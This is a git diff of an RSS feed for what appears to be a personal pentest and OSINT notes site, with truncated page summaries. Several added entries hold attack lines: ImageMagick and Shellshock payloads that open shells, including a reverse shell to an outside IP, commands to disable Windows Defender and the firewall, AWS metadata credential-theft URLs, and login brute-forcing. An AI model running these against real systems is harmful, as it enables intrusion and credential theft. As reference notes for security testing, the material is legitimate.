-Deblurring images # Gaussian Blur # Install GIMP Plugin &amp;#34;G&amp;#39;MIC&amp;#34; # Filters&amp;gt;G’MIC&amp;gt;Details&amp;gt;Sharpen (Deblur)# Pixelize # The Pixelize blur works by dividing an image into a number of squares # and then replacing all the pixels in each square by average of their values.</description>
+      <guid>/web-pentest/tools/burpsuite/</guid>
+      <description>WORK IN PROGRESS 
+Notes / Tips # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! # Firefox sends an HTTP GET every 60s to hxxp://detectportal.firefox.com. To avoid : about:config &amp;gt; network.captive-portal-service.enabled ==&amp;gt; false 
+Modules / Addons # Autorize # For Each Request you do, it will send an equal request # But with changed cookies of the session or any additional header used for authorization.</description>
     </item>
     
     <item>
@@ -1286,51 +1469,80 @@ Exploiting the classic Manager # Metasploit provides an easy to use module to up
     </item>
     
     <item>
-      <title>Images</title>
-      <link>/open-source-intelligence-osint/human-recon/images/</link>
+      <title>MISC - Tips &amp; Tricks</title>
+      <link>/open-source-intelligence-osint/human-recon/misc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/human-recon/images/</guid>
-      <description>General # Flickr Image search https://www.flickr.com/map 
-Reverse Image Search # General Engines https://images.google.com/ https://tineye.com/ https://www.bing.com/?scope=images&amp;amp;nr=1&amp;amp;FORM=NOFORM # Reverse Russia https://www.yandex.com/images/ # Reverse China http://images.baidu.com/ 
-Image Investigation # EXIF and metadata http://exif.regex.info/exif.cgi # Basics Forensics https://fotoforensics.com/ # Text recognition (OCR) https://www.newocr.com/ # Stolen Camera Finder https://www.</description>
-    </item>
-    
-    <item>
-      <title>MISC</title>
-      <link>/open-source-intelligence-osint/technical-recon/misc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/misc/</guid>
-      <description>Secrets # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com “apikey” site:http://ideone.com “aws_access_key_id”# Default passwords https://www.routerpasswords.com/ https://cirt.net/passwords https://default-password.info/ http://defaultpassword.us/ http://www.passwordsdatabase.com/ http://open-sez.me/ Orbit - Cryto Wallet Analysis # Give it a blockchain based crypto wallet address and it will crawl 3 levels deep in transaction data to plot a graph out of the information. python3 orbit.py # Next thing is to plot a graph for which we will be using quark framework # Then use the html output python quark.</description>
+      <guid>/open-source-intelligence-osint/human-recon/misc/</guid>
+      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php # Professionnal profiles (like photos) can be used to search for differents # personal profiles which are easier to exploit and dig 
+SocialBlade # Socialblade is an online tool where you can see and analyze Youtube, Instagram, Twitch, Twitter or Dailymotion accounts https://socialblade.</description>
     </item>
     
     <item>
       <title>OSINT-SPY</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/osint-spy/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/osint-spy/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/osint-spy/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/osint-spy/</guid>
       <description>General Informations # Performs OSINT scan on email/domain/ip_address/organization using OSINT-SPY. # It can be used by Data Miners, Infosec Researchers, Penetration Testers and cyber crime # investigator in order to find deep information about their target. # Perform scan on IP Address / domain / email address / BTC(bitcoin) address / device # Find out latest bitcoin block information # List out all the ciphers supported by particular website and server # Check whether a particular website is vulnerable to heartbleed or not ?</description>
     </item>
     
     <item>
-      <title>139/445 - SMB</title>
-      <link>/recon-enumeration/services-enumeration/139_445_smb/</link>
+      <title>PrivExchange</title>
+      <link>/windows-systems/privilege-escalation/privexchange/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/139_445_smb/</guid>
+      <guid>/windows-systems/privilege-escalation/privexchange/</guid>
+      <description>Resources https://github.com/dirkjanm/PrivExchange https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ https://chryzsh.github.io/exploiting-privexchange/ # After exploitation, you won&amp;#39;t be like Domain Admin directly, so, you won&amp;#39;t be able to connect to the # DC using Domain Admins rights. # Exploitation allows user to get DCSync privileges, which is enough to get the NTDS Database # You can then use Pass the Hash attack with administrators accounts to get real access 
+Aclpwn # ACLpwn is a tool used to find compromission paths inside BloodHound data and to exploit them # BloodHound need to be running # Many options are available # Dry option is used to look for compromission without exploiting it python aclpwn.</description>
+    </item>
+    
+    <item>
+      <title>Tinder</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/tinder/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/platforms-hunting/tinder/</guid>
+      <description># More like Social Engineering # But it&amp;#39;s possible to fake your location # Using the android app → Android Emulator # Using the web app → Fake your brower location # Then you can go on sources (web app) and get pictures to reverse image search # You can also save them using wireshark # https://www.learnallthethings.net/osmosis # You can browe users https://www.</description>
+    </item>
+    
+    <item>
+      <title>139/445 - SMB</title>
+      <link>/network/services-enumeration/139_445_smb/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/network/services-enumeration/139_445_smb/</guid>
       <description>General Informations SMB1 =&amp;gt; Win2000 / XP / 2003 SMB2.0 =&amp;gt; Vista / 2008 SMB2.1 =&amp;gt; Win7 / 2008R2 SMB3.0 =&amp;gt; Win8 / 2012 SMB 3.02 =&amp;gt; Win8.1 / 2012R2 # Configuration tips # Can be usefull to configure /etc/samba/smb.conf with: client min protocol = SMB2 client max protocol = SMB3 # Then service smbd restart 
 Identification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (identifier le nom/domaine) # Identity SMB2 support using metasploit use auxiliary/scanner/smb/smb2 set RHOST IP run # Discover real samba version if hidden ngrep -i -d tap0 ‘s.</description>
     </item>
     
     <item>
       <title>Belati</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/belati/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/belati/</guid>
       <description>General Informations # Belati is tool for Collecting Public Data &amp;amp; Public Document from Website and other service for OSINT purpose. # This tools is inspired by Foca and Datasploit for OSINT # Might need root privileges to executes all tools # Like nmap. But it works well without root (nmap won&amp;#39;t be executed) # Not totally passive as long as it does an HTTP Banner Grabbing for earch domain/subdomain found.</description>
+    </item>
+    
+    <item>
+      <title>CVE &amp; Vulns exploits</title>
+      <link>/web-pentest/cve_exploits/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-pentest/cve_exploits/</guid>
+      <description>Imagick - CVE-2016-3718 - SSRF Dans un .svg push graphic-context viewbox 0 0 640 480 fill &amp;#39;url(https://example.com/image.jpg&amp;#34;|nc -l -p 7777 -e&amp;#34;/bin/sh)&amp;#39; pop graphic-context 
+Shellshock - CVE-2014-6271 Apache mod_cgi or any CGI information ? Could be vulnerable to shellshock # Shellshock == CVE-2014-6271 # Classic PoC curl -H &amp;#34;User-Agent: () { :; }; /bin/command&amp;#34; http://example.com/ () {:;}; /bin/cat /etc/passwd # Reverse shell () { :; }; /bin/sh -c /bin/sh -i &amp;gt;&amp;amp; /dev/tcp/139.</description>
+    </item>
+    
+    <item>
+      <title>Github</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/github/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/platforms-hunting/github/</guid>
+      <description>General # Online Service used to search in many git repositories https://grep.app/ 
+Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch# Usually, credential leaks do not occur on the company public Github # But more on developer/employees personal Github</description>
     </item>
     
     <item>
@@ -1344,79 +1556,118 @@ Identification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (id
     
     <item>
       <title>Postman</title>
-      <link>/web-attacks/postman/</link>
+      <link>/web-pentest/tools/postman/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/postman/</guid>
+      <guid>/web-pentest/tools/postman/</guid>
       <description>https://www.guru99.com/postman-tutorial.html https://openclassrooms.com/fr/courses/4668056-construisez-des-microservices/5123020-testez-votre-api-grace-a-postman https://www.toolsqa.com/postman-tutorial/ https://amethyste16.wordpress.com/2016/02/24/tutoriel-postman/ 
 User Interface Header # Import --&amp;gt; Used to import collection or environment. # Runner --&amp;gt; Automation tests can be executed through the Collection Runner. # Workspace --&amp;gt; You can divide work using workspaces Sidebar # History --&amp;gt; Past requests that you have sent will be displayed in History. # This makes it easy to track actions that you have done. # Organize --&amp;gt; your test suite by creating collections.</description>
     </item>
     
     <item>
-      <title>143 - IMAP</title>
-      <link>/recon-enumeration/services-enumeration/143_imap/</link>
+      <title>Windows Defender</title>
+      <link>/windows-systems/privilege-escalation/windows_defender/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/143_imap/</guid>
+      <guid>/windows-systems/privilege-escalation/windows_defender/</guid>
+      <description># Requires admin privileges or being able to run a custom powershell sudo ! (sudo.ps1) powershell -ExecutionPolicy ByPass -command &amp;#34;&amp;amp; { . C:\Users\Username\AppData\Local\Temp\sudo_PS1-0.ps1; }&amp;#34; # Stop Windows Defender using cmd.exe sc stop WinDefend # Identify firewall profiles for an user netsh advfirewall show allprofiles # Disable all firewall profiles for an user netsh advfirewall set allprofiles state off # Totally disable the firewall netsh firewall set opmode disable</description>
+    </item>
+    
+    <item>
+      <title>143 - IMAP</title>
+      <link>/network/services-enumeration/143_imap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/network/services-enumeration/143_imap/</guid>
       <description> Identification and Scans # Nmap scan nmap -v -sV --version-intensity=5 --script imap-capabilities -p T:143 &amp;lt;IP&amp;gt; # Banner grabbing telnet &amp;lt;IP&amp;gt; 143 # Banner grabbing and test connection nc -nv IP 143 A1 LOGIN “root” “” A1 LOGIN root toor A1 LOGIN root root</description>
     </item>
     
     <item>
-      <title>Amazon Web Services (AWS)</title>
-      <link>/web-attacks/amazon_web_services/</link>
+      <title>Amazon &amp; Digital Ocean Buckets</title>
+      <link>/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/amazon_web_services/</guid>
+      <guid>/open-source-intelligence-osint/platforms-hunting/amazon_digitalocean/</guid>
+      <description>Look for static content in HTML, you can find content hosted on s3 bucket for example and then exploit it  
+AWS Bucket access (SSRF for example) # You can get informations and secret about an S3 bucket # Credentials, main goal http://169.254.169.254/latest/meta-data/iam/security-credentials/ http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/ # You might need the zone http://169.254.169.254/latest/dynamic/instance-identity/document # Then set # AWS_ACCESS_KEY_ID # AWS_SECRET_ACCESS_KEY # AWS_DEFAULT_REGION # AWS_SESSION_TOKEN 
+Amazon S3 (AWS) Buckets # Tools like AWSBucketDump can enumerate AWS S3 buckets https://github.</description>
+    </item>
+    
+    <item>
+      <title>Amazon Web Services (AWS)</title>
+      <link>/other-systems/amazon_web_services/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/other-systems/amazon_web_services/</guid>
       <description>https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://github.com/RhinoSecurityLabs/ccat https://github.com/RhinoSecurityLabs/pacu https://github.com/carnal0wnage/weirdAAL https://github.com/Static-Flow/CloudCopy # Cheatsheet https://www.magnussen.funcmylife.fr/article_35 GitLeaks (https://github.com/zricethezav/gitleaks) # Audit git repos for secrets keys ./gitleaks --repo=xxxxx --verbose --pretty 
 Enumerate IAM (https://github.com/andresriancho/enumerate-iam) # Enumerate the permissions associated with AWS credential set ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... # enumerate-iam.py tries to brute force all API calls allowed by the IAM policy. # The calls performed by this tool are all non-destructive (only get* and list* calls are performed).</description>
     </item>
     
     <item>
-      <title>Attacking APIs</title>
-      <link>/web-attacks/attacking_apis/</link>
+      <title>Bug Bounty Tips</title>
+      <link>/web-pentest/bug_bounty_tips/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/attacking_apis/</guid>
-      <description>Resources https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93 https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765 https://github.com/smodnix/31-days-of-API-Security-Tips https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0 https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2 
-SOAP vs REST # REST uses: HTTP, JSON , URL and XML # SOAP uses: mostly HTTP and XML # SOAP can be more recommandded in terms of security, if you have to process critical data. 
-Checklist # Test tokens # Authentication token, JWT, Base64 encoded... # Input validation # All entry points (command injection, sql injections, html...) # Cookies, Headers ?</description>
+      <guid>/web-pentest/bug_bounty_tips/</guid>
+      <description> General # This section will be mainly used to store information found on Twitter # About some bug bounty tips &amp;amp; web tricks 
+Password Reset https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1 # 1/ Include controlled mail as a second parameter # 2/ Bruteforce reset token # 3/ Try to use a reset token on another account # 4/ Try to figure out how token are generated</description>
     </item>
     
     <item>
       <title>sn0int</title>
-      <link>/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/</link>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/sn0int/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/sn0int/</guid>
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/sn0int/</guid>
       <description>Getting Started # Documentation https://github.com/kpcyrd/sn0int https://sn0int.readthedocs.io # Registry https://sn0int.com/ # Default, no modules installed # Quick install &amp;gt; pkg quickstart &amp;gt; pkg --help # Scopes &amp;gt; workspace demo &amp;gt; add domain Domain : domain.com # Confirm &amp;gt; select domains &amp;gt; select domains where id=1 &amp;gt; select domains where value like %.com &amp;gt; select domains where ( value like e% and value like %m ) or false # Modules # Informations gathered by modules can be picked up by others &amp;gt; pkg list # Certificate transparency &amp;gt; use ctlogs &amp;gt; run # DNS &amp;gt; use dns-resolve &amp;gt; run # Scan for discovered URLs &amp;gt; use url-scan &amp;gt; target &amp;gt; target where resolvable &amp;gt; run &amp;gt; select urls</description>
     </item>
     
     <item>
       <title>161/162 - SNMP</title>
-      <link>/recon-enumeration/services-enumeration/161_162_snmp/</link>
+      <link>/network/services-enumeration/161_162_snmp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/161_162_snmp/</guid>
+      <guid>/network/services-enumeration/161_162_snmp/</guid>
       <description>Resources https://blog.cedrictemple.net/239-faire-des-requetes-snmp-en-ligne-de-commande-sous-linux/ 
 Identification &amp;amp; Scans nmap -vv -sV --version-intensity=5 -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes IP 
 Snmpwalk snmpwalk -c public -v1 IP 1 &amp;gt; snmpwalk.txt Windows RUNNING PROCESSES 1.3.6.1.2.1.25.4.2.1.2 Windows INSTALLED SOFTWARE 1.3.6.1.2.1.25.6.3.1.2 Windows SYSTEM INFO 1.3.6.1.2.1.1.1 Windows HOSTNAME 1.3.6.1.2.1.1.5 Windows DOMAIN 1.3.6.1.4.1.77.1.4.1 Windows UPTIME 1.3.6.1.2.1.1.3 Windows USERS 1.3.6.1.4.1.77.1.2.25 Windows SHARES 1.3.6.1.4.1.77.1.2.27 Windows DISKS 1.3.6.1.2.1.25.2.3.1.3 Windows SERVICES 1.3.6.1.4.1.77.1.2.3.1.1 Windows LISTENING TCP PORTS 1.3.6.1.2.1.6.13.1.3.0.0.0.0 Windows LISTENING UDP PORTS 1.3.6.1.2.1.7.5.1.2.0.0.0.0 Linux RUNNING PROCESSES 1.</description>
     </item>
     
     <item>
-      <title>389/636/3269 - LDAP</title>
-      <link>/recon-enumeration/services-enumeration/389_636_3269_ldap/</link>
+      <title>MISC</title>
+      <link>/web-pentest/misc_tricks/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/389_636_3269_ldap/</guid>
+      <guid>/web-pentest/misc_tricks/</guid>
+      <description># Security Headers https://securityheaders.com # /!\ HTTP POST Requests needs two carriage return at the end to be valid ! 
+NIP IO / SSRF Redirections # Redirections / Bypass filters for SSRF # &amp;lt;anything&amp;gt;.&amp;lt;IP&amp;gt;.nip.io will redirect to the &amp;lt;IP&amp;gt; you specify 1.1.1.1.nip.io will resolve to 1.1.1.1 
+Spring Boot # Spring Boot / Metrics /metrics → Endpoint showing tons of endpoints /heapdump → Get a memory dump of the application Exploit → jhat -port 7401 -J-Xmx4G heapdump2016-12-27-13-54-live2196484565712626494.</description>
+    </item>
+    
+    <item>
+      <title>Photon</title>
+      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/photon/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/photon/</guid>
+      <description>General Informations # Photon is a fast OSINT web crawler which can retrieve the following data for a target : # URLs (in-scope &amp;amp; out-of-scope) # URLs with parameters (example.com/gallery.php?id=2) # Intel (emails, social media accounts, amazon buckets etc.) # Files (pdf, png, xml etc.) # Secret keys (auth/API keys &amp;amp; hashes) # JavaScript files &amp;amp; Endpoints present in them # Strings matching custom regex pattern # Subdomains &amp;amp; DNS related data # You can use the --ninja 4 option to get 4 clients requesting server.</description>
+    </item>
+    
+    <item>
+      <title>389/636/3269 - LDAP</title>
+      <link>/network/services-enumeration/389_636_3269_ldap/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/network/services-enumeration/389_636_3269_ldap/</guid>
       <description>General Informations # Ports 389 - LDAP 636 - LDAPS (SSL) 3269 - LDAP Global Catalog # Architecture (LDAP is hierarchical) - DC = Domain Component, the domain name - OU = Organizational Unit, \&amp;#34;folders - CN = Common Name, the name fiven to the objects (Username, Group name, Computer name, etc.) # Research syntax ldapsearch &amp;lt;bind options&amp;gt; -b &amp;lt;base to search from&amp;gt; &amp;lt;search filter&amp;gt; &amp;lt;attributes&amp;gt; # Interesting attributes for user class ldapsearch “(objectClass=user)” interesting attributes: - sAMAccountName - userPrincipalName - memberOf (groups) - badPwdCount (failed logins) - lastLogoff (timestamp) - lastLogon (timestamp) - pwdLastSet (timestamp) - logonCount # Interesting attributes for group class ldapsearch “(objectClass=group)” interesting attributes: - cn - member (one per user/group) - memberOf (if nested in another group) # Interesting attributes for computer class ldapsearch “(objectClass=computer)” interesting attributes: - name (NetBIOS name) - DNSHostName (FQDN) =&amp;gt; combine it with DNS lookups and you can enumerate every IP address in the domain without scanning - operatingSystem - operatingSystemVersion (patch level) - lastLogonTimestamp - servicePrincipalName (running services =&amp;gt; TERMSRV, HTTP, MSSQL)</description>
     </item>
     
     <item>
       <title>995 - POP3S</title>
-      <link>/recon-enumeration/services-enumeration/995_pop3s/</link>
+      <link>/network/services-enumeration/995_pop3s/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/995_pop3s/</guid>
+      <guid>/network/services-enumeration/995_pop3s/</guid>
       <description> Identification and Scans # Retrieve POP3 server capabilities (CAPA, TOP, USER, SASL, RESP-CODES, LOGIN-DELAY, PIPELINING, EXPIRE, UIDL, IMPLEMENTATION) nmap -v -sV --version-intensity=5 --script pop3-capabilities -p T:995 IP # Try to bruteforce POP3 accounts nmap --script pop3-brute --script-args pop3loginmethod=SASL-LOGIN -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=SASL-CRAM-MD5 -p T:995 IP nmap --script pop3-brute --script-args pop3loginmethod=APOP -p T:995 IP 
 SSL Checking # Using openssl openssl s_client -connect IP:995 
 Authentication Checking (classical credentials) USER admin PASS admin USER root PASS root USER root PASS toor</description>
@@ -1424,49 +1675,40 @@ Authentication Checking (classical credentials) USER admin PASS admin USER root 
     
     <item>
       <title>1025 - NFS/IIS</title>
-      <link>/recon-enumeration/services-enumeration/1025_nfs_iis/</link>
+      <link>/network/services-enumeration/1025_nfs_iis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/1025_nfs_iis/</guid>
+      <guid>/network/services-enumeration/1025_nfs_iis/</guid>
       <description>Identification and Checking # Check on the Web port (80 ?): # _vti_pvt for OSCP /_vti_pvt/access.cnf /_vti_pvt/service.cnf /_vti_inf.htm 
 WebDAV Exploitation using Metasploit # Checking WebDAV using metasploit use auxiliary/scanner/http/webdav_scanner set rhosts &amp;lt;IP&amp;gt; run # Content discovery using metasploit use auxiliary/scanner/http/webdav_website_content set rhosts &amp;lt;IP&amp;gt; run # Checking authentication using metasploit use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass set rhosts &amp;lt;IP&amp;gt; run # Upload exploitation using metasploit use exploit/windows/iis/iis_webdav_upload_asp 
 Manual WebDAV exploitation (cadaver) cadaver http://IP/ # Goal is to upload file on IIS Server.</description>
     </item>
     
     <item>
-      <title>Resources</title>
-      <link>/resources/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/resources/</guid>
-      <description>General InfoSec Resources # HackTheBox video WU https://ippsec.rocks/# # Resources, cheatsheets etc about EVERYTHING https://github.com/trimstray/the-book-of-secret-knowledge # Famous engines https://start.me/p/QRENnO/databases # OSINT Resources https://start.me/p/rx6Qj8/start-page # Breakout of Citrix environments https://www.</description>
-    </item>
-    
-    <item>
       <title>1433 - MSSQL</title>
-      <link>/recon-enumeration/services-enumeration/1433_mssql/</link>
+      <link>/network/services-enumeration/1433_mssql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/1433_mssql/</guid>
+      <guid>/network/services-enumeration/1433_mssql/</guid>
       <description>Identification and Scans # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -sT -Pn -p T:1433 --script=xxxx &amp;lt;IP&amp;gt; # Bruteforce accounts and password against a MSSQL Server ms-sql-brute # Queries Microsoft SQL Server (ms-sql) instances for a list of databases, linked servers,and configuration settings. # Credentials required ms-sql-config # Queries the Microsoft SQL Browser service for the DAC (Dedicated AdminConnection) ms-sql-dac # Dumps the password hashes from an MS-SQL server in a format suitable # Credentials required ms-sql-dump-hashes # Attempts to authenticate to Microsoft SQL Servers using an empty password forthe sysadmin (sa) account.</description>
     </item>
     
     <item>
       <title>1721/500 - VPN</title>
-      <link>/recon-enumeration/services-enumeration/1721_500_vpn/</link>
+      <link>/network/services-enumeration/1721_500_vpn/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/1721_500_vpn/</guid>
+      <guid>/network/services-enumeration/1721_500_vpn/</guid>
       <description>Resources https://github.com/0x90/vpn-arsenal https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/ http://devloop.users.sourceforge.net/index.php?article108/solution-du-ctf-hacklab-vulnvpn https://resources.infosecinstitute.com/vulnvpn/#gref https://0xrick.github.io/hack-the-box/conceal/#ike-scan-Setting-up-The-Connection 
 Exploitation Techniques # IKEv2 Authenthication IP spoofing ike-scan --sport=1723 --dport=1723 --sourceip=IP_To_Spoof --ikev2 &amp;lt;IP&amp;gt; # Trying all authentication modes ike-scan --dport=1723 --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --auth=64221 &amp;lt;IP&amp;gt; # IP spoofing using ike-scan ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof --auth=64221 &amp;lt;IP&amp;gt; # IP spoofing and agressive mode ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 &amp;lt;IP&amp;gt; # Show fingerprint ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=1 --showbackoff &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=3 --showbackoff &amp;lt;IP&amp;gt; ike-scan --dport=1723 --sourceip=IP_To_Spoof -A --auth=64221 --showbackoff &amp;lt;IP&amp;gt; # Crack the key using psk-crack psk-crack hash-file.</description>
     </item>
     
     <item>
       <title>3306 - MySQL</title>
-      <link>/recon-enumeration/services-enumeration/3306_mysql/</link>
+      <link>/network/services-enumeration/3306_mysql/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/3306_mysql/</guid>
+      <guid>/network/services-enumeration/3306_mysql/</guid>
       <description>Basics # Try connection from outside mysql --host &amp;lt;IP&amp;gt; -u root -proot # Connection from the target machine mysql -u root -p root database 
 Classical commands show databases; use database_name; show tables; describe table_name; select host, user, password from mysql.user; 
 Identification and Scan # Using nmap NSE scripts nmap -n -sV --version-intensity=5 -Pn -p T:3306 --script=xxxx &amp;lt;IP&amp;gt; # Audits MySQL database server security configuration mysql-audit # Bruteforce accounts and password against a MySQL Server mysql-brute # Attempts to list all databases on a MySQL server.</description>
@@ -1474,31 +1716,21 @@ Identification and Scan # Using nmap NSE scripts nmap -n -sV --version-intensity
     
     <item>
       <title>3389 - RDP</title>
-      <link>/recon-enumeration/services-enumeration/3389_rdp/</link>
+      <link>/network/services-enumeration/3389_rdp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/3389_rdp/</guid>
+      <guid>/network/services-enumeration/3389_rdp/</guid>
       <description>Identification and Scans # Using nmap NSE scripts nmap -Pn -sV --version-intensity=5 -p T:3389 --script=xxxx &amp;lt;IP&amp;gt; # Determines which Security layer and Encryption level is supported by the RDP service rdp-enum-encryption # Checks if a machine is vulnerable to MS12-020 RDP vulnerability rdp-vuln-ms12-020.nse  
 Credentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwords.txt rdp://IP # Using ncrack for several users ncrack -vv -U users.</description>
     </item>
     
     <item>
       <title>4555 - RSIP</title>
-      <link>/recon-enumeration/services-enumeration/4555_rsip/</link>
+      <link>/network/services-enumeration/4555_rsip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/recon-enumeration/services-enumeration/4555_rsip/</guid>
+      <guid>/network/services-enumeration/4555_rsip/</guid>
       <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax ***REMOVED*** # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.</description>
-    </item>
-    
-    <item>
-      <title></title>
-      <link>/open-source-intelligence-osint/technical-recon/documents_metadata/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/documents_metadata/</guid>
-      <description>sudo +++ title = &amp;ldquo;Public Documents and Metadata&amp;rdquo; weight = &amp;ldquo;60&amp;rdquo; +++
-Getting PDF on Web Archive # Great resource https://openfacto.fr/2020/04/19/recuperer-des-fichiers-pdf-en-masse-sur-archive-org/ # Step 1 # By adding &amp;#39;*&amp;#39; at the and of a company URL, you can get all indexed documents # Then you can filter by &amp;#34;PDF&amp;#34; (right search bar) https://web.archive.org/web/*/https://testcompany.fr/* # Step 2 # Here you want to get URL list # In the Firefox developer tools -&amp;gt; Network # You can get an HTTP request to a JSON file containing URLs # Copy as curl and get the file # Step 3 # OpenRefine can help to parse and process the file # Filter on PDF # Step 4 # NEVER download directly # You can do it through archived document # Add the prefix for every line https://web.</description>
     </item>
     
   </channel>
